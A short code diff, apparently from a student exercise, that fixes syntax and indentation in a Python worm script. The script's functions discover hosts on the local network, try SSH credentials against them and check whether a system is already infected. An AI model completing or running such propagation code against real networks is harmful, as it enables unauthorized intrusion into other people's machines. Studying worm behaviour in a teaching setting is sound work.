@@ -126,6 +126,7 @@ def attackSystem(host):
 		if attemptResults == 3:
 			return None
 		elif attemptResults ==1:
+			pass
 
 		else:
 			return(ssh,username,password)
@@ -199,14 +200,14 @@ def AttactMode():
 	localIP = getMyIP()
 	# Get the hosts on the same network
 	networkHosts = getHostsOnTheSameNetwork()
-	var tempIP=[]
+	tempIP=[]
 
 	# TODO: Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
 	for i in networkHosts:
 		if networkHosts[i] != localIP:
-		tempIP.append(networkHosts[i])
+			tempIP.append(networkHosts[i])
 	print "Found hosts: ", tempIP
 
 
@@ -252,7 +253,7 @@ if len(sys.argv) < 2:
 	if isInfectedSystem()==true:
 		exit()
 	else:
-	AttactMode()
+		AttactMode()
 else:
 	AttactMode()
 
